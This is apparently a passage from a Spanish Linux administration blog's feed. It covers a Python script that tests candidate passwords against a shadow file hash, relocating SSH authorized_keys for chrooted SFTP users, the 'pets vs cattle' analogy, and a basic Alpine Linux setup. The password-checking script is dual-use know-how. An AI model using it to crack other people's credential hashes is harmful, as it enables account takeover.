        &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; crypt.crypt&lt;span class="o"&gt;(&lt;/span&gt;password, self.salt&lt;span class="o"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; self.shadow

&lt;span class="nv"&gt;shadow&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;$6$jq62gTbU$kYZgWuKLuNTX0Ur.UWiuBJuIYltW3hc7EdI2/4RpldwUoLlRl9IdXgJb6B3kxEoAxWolDwXDCqOnz8SN0CKkJ1&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;possible&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;temporal&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;baspassword&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;secret&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;supersecret&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;pc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; PasswordCracker&lt;span class="o"&gt;(&lt;/span&gt;shadow&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; password in possible:
    &lt;span class="k"&gt;if&lt;/span&gt; pc.verify&lt;span class="o"&gt;(&lt;/span&gt;password&lt;span class="o"&gt;)&lt;/span&gt;:
        print&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Password &amp;quot;%s&amp;quot; is valid&amp;#39;&lt;/span&gt; % password&lt;span class="o"&gt;)&lt;/span&gt;
root@olympus:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y una ejecución nos probaría toda la lista:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@olympus:~# ./test_passwords.py
Password &lt;span class="s2"&gt;&amp;quot;supersecret&amp;quot;&lt;/span&gt; is valid
root@olympus:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: Probar varias contraseñas no lleva mucho tiempo, pero si intentáis un generador de contraseñas posibles, puede ser muy costoso en tiempo.&lt;/p&gt;</content><category term="password"></category><category term="shadow"></category></entry><entry><title>Cambiando la posición del fichero authorized_keys</title><link href="http://www.linuxsysadmin.ml/2018/08/cambiando-la-posicion-del-fichero-authorized-keys.html" rel="alternate"></link><published>2018-08-13T09:00:00+02:00</published><updated>2018-08-13T09:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-08-13:/2018/08/cambiando-la-posicion-del-fichero-authorized-keys.html</id><summary type="html">&lt;p&gt;Un requerimiento de seguridad estándar en mi trabajo, es que los servidores SFTP no permitan la autenticación con &lt;em&gt;passwords&lt;/em&gt; normales, y estamos obligados a usar autenticación por claves. El otro día tuvimos una queja de un usuario que no podía entrar porque había eliminado su carpeta &lt;code&gt;.ssh&lt;/code&gt; de forma consciente …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Un requerimiento de seguridad estándar en mi trabajo, es que los servidores SFTP no permitan la autenticación con &lt;em&gt;passwords&lt;/em&gt; normales, y estamos obligados a usar autenticación por claves. El otro día tuvimos una queja de un usuario que no podía entrar porque había eliminado su carpeta &lt;code&gt;.ssh&lt;/code&gt; de forma consciente.&lt;/p&gt;
&lt;p&gt;En casos como este no nos queda más remedio que reirnos un rato y restablecer su fichero &lt;code&gt;authorized_keys&lt;/code&gt; desde un &lt;em&gt;backup&lt;/em&gt;. Sin embargo, hay varias preguntas que se nos deberían plantear en estos casos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;¿Por qué este usuario tenía permisos para escribir la carpeta &lt;code&gt;.ssh&lt;/code&gt;?&lt;/li&gt;
&lt;li&gt;¿Por qué estaba su fichero &lt;code&gt;authorized_keys&lt;/code&gt; en su &lt;em&gt;home&lt;/em&gt;?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Siempre debes pensar que un usuario puede meter la pata, y como son muchos, siempre tenemos muchos manazas con problemas similares. No hay nada que se pueda hacer en este sentido, pero debemos plantearnos si podemos evitar que el problema ocurrido se pueda repetir.&lt;/p&gt;
&lt;p&gt;En este caso concreto, no tardamos mucho en evitar que se repitiera, ya que disponiamos de dos métodos sencillos para evitarlo:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Quitarle los permisos de escritura en la carpeta &lt;code&gt;.ssh&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Quitar la carpeta &lt;code&gt;.ssh&lt;/code&gt; de su línea de tiro, concretamente, fuera de su jaula.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Cabe decir que nos decantamos por la 2, y aquí explico como se hace.&lt;/p&gt;
&lt;h2&gt;Mover el fichero authorized_keys de sitio&lt;/h2&gt;
&lt;p&gt;Empezamos con un &lt;em&gt;setup&lt;/em&gt; estándar en donde &lt;strong&gt;bob&lt;/strong&gt; puede entrar usando su clave ssh:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ sftp -i id_bob bob@sftpserver
Connected to sftpserver.
sftp&amp;gt; ls -la
drwxr-xr-x    &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;        &lt;span class="m"&gt;0&lt;/span&gt;            &lt;span class="m"&gt;4096&lt;/span&gt; Jul &lt;span class="m"&gt;18&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:42 .
drwxr-xr-x    &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;        &lt;span class="m"&gt;0&lt;/span&gt;            &lt;span class="m"&gt;4096&lt;/span&gt; Jul &lt;span class="m"&gt;18&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:42 ..
drwxr-xr-x    &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;1001&lt;/span&gt;     &lt;span class="m"&gt;1001&lt;/span&gt;         &lt;span class="m"&gt;4096&lt;/span&gt; Jul &lt;span class="m"&gt;18&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:42 .ssh
drwxr-xr-x    &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;1001&lt;/span&gt;     &lt;span class="m"&gt;1001&lt;/span&gt;         &lt;span class="m"&gt;4096&lt;/span&gt; Jul &lt;span class="m"&gt;18&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:38 archives
sftp&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con los permisos mostrados, no le sería difícil eliminar su clave, que es la única manera permitida de entrar en su cuenta; así pues, vamos a mover la posición de dicho fichero para que no lo vea el usuario en su &lt;em&gt;home&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El truco consiste en modificar la directiva &lt;code&gt;AuthorizedKeysFile&lt;/code&gt; en el fichero &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;. Mas información en &lt;a href="https://linux.die.net/man/5/sshd_config"&gt;las páginas &lt;em&gt;man&lt;/em&gt;&lt;/a&gt;. Especificamente nos interesa el &lt;em&gt;token&lt;/em&gt; &lt;code&gt;%u&lt;/code&gt;, que es el nombre del usuario que intenta logarse, en este caso, &lt;strong&gt;bob&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Como decisión de diseño, vamos a poner las claves en &lt;code&gt;/srv/sshkeys/&amp;lt;usuario&amp;gt;&lt;/code&gt;, aunque esto es arbitrario y susceptible a cambio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sftpserver:~$ cat /etc/ssh/sshd_config
...
AuthorizedKeysFile /srv/sshkeys/%u
...
Match Group sftponly
  ChrootDirectory %h
  ForceCommand internal-sftp
  PasswordAuthentication no
gerard@sftpserver:~$ sudo service ssh restart
gerard@sftpserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nos cargamos la carpeta &lt;code&gt;.ssh&lt;/code&gt; del usuario &lt;strong&gt;bob&lt;/strong&gt; y la ponemos en &lt;code&gt;/srv/sshkeys/bob&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sftpserver:~$ ls -la /home/bob/
total &lt;span class="m"&gt;12&lt;/span&gt;
drwxr-xr-x &lt;span class="m"&gt;3&lt;/span&gt; root root &lt;span class="m"&gt;4096&lt;/span&gt; jul &lt;span class="m"&gt;19&lt;/span&gt; &lt;span class="m"&gt;08&lt;/span&gt;:46 .
drwxr-xr-x &lt;span class="m"&gt;4&lt;/span&gt; root root &lt;span class="m"&gt;4096&lt;/span&gt; jul &lt;span class="m"&gt;18&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:35 ..
drwxr-xr-x &lt;span class="m"&gt;2&lt;/span&gt; bob  bob  &lt;span class="m"&gt;4096&lt;/span&gt; jul &lt;span class="m"&gt;18&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:38 archives
gerard@sftpserver:~$ cat /srv/sshkeys/bob
ssh-rsa ...
gerard@sftpserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y sin sorpresas, la mecánica no cambia nada, solo que en este caso, el usuario no tiene el fichero &lt;code&gt;authorized_keys&lt;/code&gt; a tiro, y por lo tanto, no puede liarla.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ sftp -i id_bob bob@sftpserver
Connected to sftpserver.
sftp&amp;gt; ls -la
drwxr-xr-x    &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;        &lt;span class="m"&gt;0&lt;/span&gt;            &lt;span class="m"&gt;4096&lt;/span&gt; Jul &lt;span class="m"&gt;19&lt;/span&gt; &lt;span class="m"&gt;06&lt;/span&gt;:46 .
drwxr-xr-x    &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;        &lt;span class="m"&gt;0&lt;/span&gt;            &lt;span class="m"&gt;4096&lt;/span&gt; Jul &lt;span class="m"&gt;19&lt;/span&gt; &lt;span class="m"&gt;06&lt;/span&gt;:46 ..
drwxr-xr-x    &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;1001&lt;/span&gt;     &lt;span class="m"&gt;1001&lt;/span&gt;         &lt;span class="m"&gt;4096&lt;/span&gt; Jul &lt;span class="m"&gt;18&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:38 archives
sftp&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto nos ahorramos problemas futuros del tipo "he borrado la carpeta &lt;code&gt;.ssh&lt;/code&gt;".&lt;/p&gt;</content><category term="ssh"></category><category term="sftp"></category><category term="authorized_keys"></category><category term="jaula"></category></entry><entry><title>Servidores "pets vs cattle"</title><link href="http://www.linuxsysadmin.ml/2018/08/servidores-pets-vs-cattle.html" rel="alternate"></link><published>2018-08-06T09:00:00+02:00</published><updated>2018-08-06T09:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-08-06:/2018/08/servidores-pets-vs-cattle.html</id><summary type="html">&lt;p&gt;Es muy divertido ir a una reunión con gente de negocio y decir algo como "tratamos los servidores como ganado". La cara que suelen poner es épica, en parte porque no conocen lo que eso significa, y en parte porque asocian ese término en otros ámbitos, como el ámbito ganadero …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Es muy divertido ir a una reunión con gente de negocio y decir algo como "tratamos los servidores como ganado". La cara que suelen poner es épica, en parte porque no conocen lo que eso significa, y en parte porque asocian ese término en otros ámbitos, como el ámbito ganadero.&lt;/p&gt;
&lt;p&gt;En el paradigma &lt;em&gt;legacy&lt;/em&gt; de tratar a los servidores, cuando un servidor se estropeaba o hacía cosas raras, todos teníamos que correr; se hacía lo imposible para restablecer ese mismo servidor. Hoy en día las cosas cambian: es más fácil crear un servidor nuevo y tenerlo listo de forma automatizada.&lt;/p&gt;
&lt;h2&gt;Pets vs cattle (mascotas vs ganado)&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Randy Bias&lt;/strong&gt; narra la historia del término afirmando que probablemente se originó en 2011 o 2012, cuando &lt;strong&gt;Bill Baker&lt;/strong&gt; utilizó la analogía para describir las estrategias arquitectónicas de "escalado vertical" frente a "escalado horizontal". &lt;strong&gt;Bias&lt;/strong&gt; adoptó esta analogía en sus patrones arquitectónicos en la nube:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In the old way of doing things, we treat our servers like pets, for example Bob the mail server. If Bob goes down, it’s all hands on deck. The CEO can’t get his email and it’s the end of the world. In the new way, servers are numbered, like cattle in a herd. For example, www001 to www100. When one server goes down, it’s taken out back, shot, and replaced on the line.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="Pets vs cattle" src="http://www.linuxsysadmin.ml/images/pets_vs_cattle.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;¿Pero que son exactamente "mascotas" y "ganado"?&lt;/h2&gt;
&lt;p&gt;En el mundo actual, no nos importan demasiado los servidores; no es importante que funcione un servidor, sino dar servicio. Queremos algo como "4 instancias de la API" o "2 servidores con mi tienda online".&lt;/p&gt;
&lt;p&gt;De hecho, algunos servicios &lt;em&gt;cloud&lt;/em&gt; van tan lejos como vender &lt;em&gt;serverless&lt;/em&gt; o &lt;em&gt;function as a service&lt;/em&gt;, en donde no hay servidores, sino código. Con que se garantize que tu código se ejecute, basta; no nos importa donde, solo que se haga.&lt;/p&gt;
&lt;p&gt;Esto nos permite poner más valor a nuestro servicio y menos preocupaciones respecto a la infraestructura donde se ejecuta, lo que suele traducirse en un coste más acotado; podemos prescindir de operadores en favor de más desarrolladores o QAs.&lt;/p&gt;
&lt;h3&gt;Pets (mascotas)&lt;/h3&gt;
&lt;p&gt;Se trata de servidores que son irremplazables; si se estropea, corremos todos, y hay que restaurar el servicio &lt;em&gt;in-situ&lt;/em&gt;. En palabras de &lt;strong&gt;Bias&lt;/strong&gt;, sería algo así:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Servers or server pairs that are treated as indispensable or unique systems that can never be down. Typically they are manually built, managed, and “hand fed”. Examples include mainframes, solitary servers, HA loadbalancers/firewalls (active/active or active/passive), database systems designed as master/slave (active/passive), and so on.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Cattle (ganado)&lt;/h3&gt;
&lt;p&gt;Son servidores que son fácilmente reemplazables; normalmente su pérdida importa poco y podemos reemplazarlos provisionando uno nuevo, normalmente de forma automatizada.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Arrays of more than two servers, that are built using automated tools, and are designed for failure, where no one, two, or even three servers are irreplaceable. Typically, during failure events no human intervention is required as the array exhibits attributes of “routing around failures” by restarting failed servers or replicating data through strategies like triple replication or erasure coding. Examples include web server arrays, multi-master datastores such as Cassandra clusters, multiple racks of gear put together in clusters, and just about anything that is load-balanced and multi-master.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;¿Son tus servidores mascotas o ganado?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;</content><category term="pets vs cattle"></category></entry><entry><title>Una oda a Alpine Linux</title><link href="http://www.linuxsysadmin.ml/2018/07/una-oda-a-alpine-linux.html" rel="alternate"></link><published>2018-07-30T09:00:00+02:00</published><updated>2018-07-30T09:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-07-30:/2018/07/una-oda-a-alpine-linux.html</id><summary type="html">&lt;p&gt;Hace unos días salió la &lt;em&gt;release&lt;/em&gt; 3.8 de &lt;strong&gt;Alpine Linux&lt;/strong&gt;. Por problemas varios en el &lt;em&gt;build&lt;/em&gt;, la imagen de &lt;strong&gt;docker&lt;/strong&gt; se hizo esperar bastante, y como la paciencia no es una de mis virtudes, decidí darle un intento en una máquina virtual &lt;strong&gt;Virtualbox&lt;/strong&gt;, quedando gratamente complacido con el resultado …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hace unos días salió la &lt;em&gt;release&lt;/em&gt; 3.8 de &lt;strong&gt;Alpine Linux&lt;/strong&gt;. Por problemas varios en el &lt;em&gt;build&lt;/em&gt;, la imagen de &lt;strong&gt;docker&lt;/strong&gt; se hizo esperar bastante, y como la paciencia no es una de mis virtudes, decidí darle un intento en una máquina virtual &lt;strong&gt;Virtualbox&lt;/strong&gt;, quedando gratamente complacido con el resultado obtenido.&lt;/p&gt;
&lt;p&gt;El primer paso es descargar la imagen de &lt;a href="https://alpinelinux.org/downloads/"&gt;la pagina de descargas&lt;/a&gt;. En esta página hay que elegir la variante de la imagen y la variante del procesador; aplicando a mi máquina y sabiendo que voy a ejecutarlo como máquina virtual, he elegido &lt;a href="http://dl-cdn.alpinelinux.org/alpine/v3.8/releases/x86_64/alpine-virt-3.8.0-x86_64.iso"&gt;esta&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Se trata de un fichero &lt;code&gt;.iso&lt;/code&gt; de 32mb que, a su vez, es un &lt;em&gt;livecd&lt;/em&gt; con el instalador incorporado. Es una distribución muy ligera, así que con una máquina virtual de 256mb de memoria funciona de sobras para la instalación base con SSH y nada más; modificaremos este valor cuando necesitemos más memoria para otro tipo de carga de trabajo.&lt;/p&gt;
&lt;p&gt;Iniciamos la máquina virtual con el CD montado, y obtenemos un &lt;em&gt;shell&lt;/em&gt;, previo &lt;em&gt;login&lt;/em&gt; con el usuario &lt;strong&gt;root&lt;/strong&gt; y sin contraseña. En este momento, estamos consumiendo 33mb de memoria (sin &lt;em&gt;buffers&lt;/em&gt;), lo que nos deja con más de 200mb disponibles para nuestro uso.&lt;/p&gt;
&lt;p&gt;Como &lt;em&gt;livecd&lt;/em&gt; es muy bonito, pero lo que queremos es &lt;strong&gt;instalar&lt;/strong&gt;. Esto se consigue con el &lt;em&gt;script&lt;/em&gt; &lt;code&gt;setup-alpine&lt;/code&gt;. Sin embargo, si nos leemos &lt;a href="https://wiki.alpinelinux.org/wiki/Alpine_setup_scripts#setup-disk"&gt;la documentación&lt;/a&gt; de los &lt;em&gt;scripts&lt;/em&gt; de la instalación veremos varias cosas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Por defecto, se crean 3 particiones:&lt;ul&gt;
&lt;li&gt;La partición raíz, montada en &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Una partición para los ficheros de &lt;em&gt;boot&lt;/em&gt;, montados en &lt;code&gt;/boot&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Una partición de &lt;em&gt;swap&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;El instalador se puede parametrizar con variables de entorno&lt;ul&gt;
&lt;li&gt;Podemos modificar el tamaño de la particion &lt;code&gt;/boot&lt;/code&gt;, pero no eliminarla con &lt;code&gt;BOOT_SIZE&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Podemos modificar el tamaño de la partición &lt;em&gt;swap&lt;/em&gt; con &lt;code&gt;SWAP_SIZE&lt;/code&gt;, incluso eliminándola con tamaño 0&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Como pretendo modificar la &lt;em&gt;swap&lt;/em&gt; a posteriori, prefiero &lt;a href="http://www.linuxsysadmin.ml/2018/07/ampliando-la-memoria-swap-mediante-swapfiles.html"&gt;crear un &lt;em&gt;swapfile&lt;/em&gt;&lt;/a&gt;, y por lo tanto voy a anular la partición &lt;em&gt;swap&lt;/em&gt; indicando tamaño 0.&lt;/p&gt;
&lt;p&gt;Lanzamos el comando &lt;code&gt;SWAP_SIZE=0 setup-alpine&lt;/code&gt; para realizar la instalación. El proceso en sí mismo no tiene ninguna complicación y está listo en menos de 5 minutos; solo voy a detallar las opciones que he ido usando:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Teclado&lt;/strong&gt;: El que tengáis; pongo "es"&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Hostname&lt;/strong&gt;: De momento "alpine"; cuando clone la máquina ya lo cambiaré&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Red&lt;/strong&gt;: Lo que os haga falta; yo he usado &lt;em&gt;eth0&lt;/em&gt; en modo &lt;em&gt;dhcp&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Zona horaria&lt;/strong&gt;: Algo como "Europe" y luego "Madrid"&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Mirrors de &lt;em&gt;apk&lt;/em&gt;&lt;/strong&gt;: Pongo "f"; es un proceso lento, pero a la larga vale la pena&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Servidor de SSH&lt;/strong&gt;: Voy a lo seguro, "openssh"&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Clente de NTP&lt;/strong&gt;: Dejo el que viene por defecto "chrony"&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Disco a usar&lt;/strong&gt;: El que tengáis, yo pongo "sda", usado como "sys", que es instalación tradicional&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Y con esto estamos. Reiniciamos sin el &lt;em&gt;live cd&lt;/em&gt; y ya estamos en nuestro nuevo y flamante servidor &lt;strong&gt;Alpine Linux&lt;/strong&gt;, que nos ocupa 26mb de memoria solamente.&lt;/p&gt;
&lt;h2&gt;Siguientes pasos&lt;/h2&gt;
&lt;p&gt;La instalación base está realmente bien, aunque algunas modificaciones nos van a venir muy bien; algunas son muy evidentes y otras son para nota.&lt;/p&gt;
&lt;h3&gt;Usuario nominal y sudo&lt;/h3&gt;
&lt;p&gt;Por defecto, &lt;strong&gt;Alpine Linux&lt;/strong&gt; solo crea el usuario &lt;strong&gt;root&lt;/strong&gt;, que encima, no puede entrar por SSH usando contraseña. Esto nos deja sin acceso al servidor.&lt;/p&gt;
&lt;p&gt;Siguiendo el estilo &lt;strong&gt;Ubuntu&lt;/strong&gt;, vamos a crear un usuario nominal con permisos de &lt;strong&gt;sudo&lt;/strong&gt;, y vamos a bloquear al usuario &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alpine:~# apk add sudo
...
alpine:~# adduser gerard
...
alpine:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Alpine Linux&lt;/strong&gt; viene por defecto con el grupo &lt;strong&gt;wheel&lt;/strong&gt;, pero no con el grupo &lt;strong&gt;sudo&lt;/strong&gt;. Así pues, vamos a habilitar &lt;strong&gt;sudo&lt;/strong&gt; para todos los usuarios del grupo &lt;strong&gt;wheel&lt;/strong&gt;, al que añadiremos a nuestro usuario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alpine:~# cat /etc/sudoers &lt;span class="p"&gt;|&lt;/span&gt; grep ^%wheel
%wheel &lt;span class="nv"&gt;ALL&lt;/span&gt;&lt;span class="o"&gt;=(&lt;/span&gt;ALL&lt;span class="o"&gt;)&lt;/span&gt; ALL
alpine:~# adduser gerard wheel
alpine:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y nos logamos al servidor con el usuario nominal. Probamos que podemos hacer &lt;strong&gt;sudo&lt;/strong&gt; y si es así, bloqueamos el usuario &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alpine:~$ id
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;wheel&lt;span class="o"&gt;)&lt;/span&gt;,1000&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt;
alpine:~$ sudo id
&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; gerard:
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;,1&lt;span class="o"&gt;(&lt;/span&gt;bin&lt;span class="o"&gt;)&lt;/span&gt;,2&lt;span class="o"&gt;(&lt;/span&gt;daemon&lt;span class="o"&gt;)&lt;/span&gt;,3&lt;span class="o"&gt;(&lt;/span&gt;sys&lt;span class="o"&gt;)&lt;/span&gt;,4&lt;span class="o"&gt;(&lt;/span&gt;adm&lt;span class="o"&gt;)&lt;/span&gt;,6&lt;span class="o"&gt;(&lt;/span&gt;disk&lt;span class="o"&gt;)&lt;/span&gt;,10&lt;span class="o"&gt;(&lt;/span&gt;wheel&lt;span class="o"&gt;)&lt;/span&gt;,11&lt;span class="o"&gt;(&lt;/span&gt;floppy&lt;span class="o"&gt;)&lt;/span&gt;,20&lt;span class="o"&gt;(&lt;/span&gt;dialout&lt;span class="o"&gt;)&lt;/span&gt;,26&lt;span class="o"&gt;(&lt;/span&gt;tape&lt;span class="o"&gt;)&lt;/span&gt;,27&lt;span class="o"&gt;(&lt;/span&gt;video&lt;span class="o"&gt;)&lt;/span&gt;
alpine:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alpine:~$ sudo passwd -l root
passwd: password &lt;span class="k"&gt;for&lt;/span&gt; root changed by root
alpine:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Creación de un swapfile&lt;/h3&gt;
&lt;p&gt;Como pretendíamos clonar esta imagen base, se decidió deshabilitar la partición &lt;em&gt;swap&lt;/em&gt; con &lt;code&gt;SWAP_SIZE=0&lt;/code&gt;. Esto nos deja si memoria &lt;em&gt;swap&lt;/em&gt;, y no es recomendable. Para poder redimensionar la memoria &lt;em&gt;swap&lt;/em&gt; en cada clon, lo fácil es &lt;a href="http://www.linuxsysadmin.ml/2018/07/ampliando-la-memoria-swap-mediante-swapfiles.html"&gt;crear la &lt;em&gt;swap&lt;/em&gt; en un fichero&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Para ello solo hay que crear un fichero para tal uso, con el tamaño deseado y perteciendo a &lt;strong&gt;root&lt;/strong&gt;, con permisos 600. Lo formateamos como &lt;em&gt;swap&lt;/em&gt; y ya lo tenemos preparado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alpine:~$ sudo dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/zero &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/swapfile &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1M &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;512&lt;/span&gt;
...
alpine:~$ sudo chmod &lt;span class="m"&gt;600&lt;/span&gt; /swapfile
alpine:~$ sudo mkswap /swapfile
...
alpine:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para que se monte automáticamente en cada &lt;em&gt;boot&lt;/em&gt;, se necesitan dos cosas: ponerlo en &lt;code&gt;/etc/fstab&lt;/code&gt; y tener el servicio &lt;strong&gt;swap&lt;/strong&gt; activado en &lt;strong&gt;boot time&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alpine:~$ grep swap /etc/fstab
/swapfile none swap sw &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
alpine:~$ sudo rc-update add swap
 * service swap added to runlevel default
alpine:~$
&lt;/pre&gt;&lt;/div&gt;


